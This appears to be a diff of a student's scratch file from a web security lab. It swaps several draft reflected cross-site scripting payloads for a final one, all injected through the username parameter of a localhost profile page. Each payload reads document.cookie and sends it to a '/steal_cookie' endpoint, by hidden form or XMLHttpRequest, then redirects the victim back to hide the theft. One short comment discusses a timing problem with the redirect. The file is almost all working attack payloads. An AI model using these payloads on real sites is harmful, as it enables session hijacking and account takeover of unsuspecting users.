@@ -1,14 +1,1 @@
-http://localhost:3000/profile?username=</p><form action="/steal_cookie" target="iframeholder" method="get" id="cookieform" onsubmit=""><input type="hidden" name="cookie" value="" id="cookieholder"/></form><iframe name="iframeholder" src="" onload="document.location='http://localhost:3000/profile'"></iframe><script type="text/javascript">document.getElementById("cookieholder").value=document.cookie%0Adocument.getElementById("cookieform").submit()</script><p>
-
-^iframe. but the onload redirect is still called before the /stolen_cookie request is sent. works without the redirect. go to OH
-
-
-
-
-http://localhost:3000/profile?username=</p><form action="/steal_cookie" target="iframeholder" method="get" id="cookieform"><input type="hidden" name="cookie" value="" id="cookieholder"/></form><iframe name="iframeholder" src=""></iframe><script type="text/javascript">document.getElementById("cookieholder").value=document.cookie%0Adocument.getElementById("cookieform").submit()</script><p>
-
-http://localhost:3000/profile?username=</p><form action="/steal_cookie" method="get" id="cookieform"><input type="hidden" name="cookie" value="" id="cookieholder"/></form><script type="text/javascript">document.getElementById("cookieholder").value=document.cookie%0Adocument.getElementById("cookieform").submit()</script><p>
-
-http://localhost:3000/profile?username=</p>%0A<script type="text/javascript">%0Arequest = new XMLHttpRequest()%0Arequest.open('GET','/steal_cookie', true)%0Arequest.setRequestHeader('Content-type','application/x-www-form-urlencoded')%0Acommand="cookie="%2Bdocument.cookie%0Arequest.send(command)%0Aalert(command)</script><p>
-
-http://localhost:3000/profile?username=</p>%0A<script type="text/javascript">%0Arequest = new XMLHttpRequest()%0Arequest.open('GET','/steal_cookie', true)%0Arequest.setRequestHeader('Content-type','application/x-www-form-urlencoded')%0Acommand="cookie="%2Bdocument.cookie%0Arequest.send(command)%0Aalert(command)%0Adocument.location="http://localhost:3000/profile"</script><p>
+http://localhost:3000/profile?username=</p>%0A<script type="text/javascript">%0Arequest = new XMLHttpRequest()%0Arequest.open('GET','/steal_cookie?cookie='%2Bdocument.cookie)%0Arequest.setRequestHeader('Content-type','application/x-www-form-urlencoded')%0Arequest.send()%0Adocument.location="http://localhost:3000/profile"</script><p>
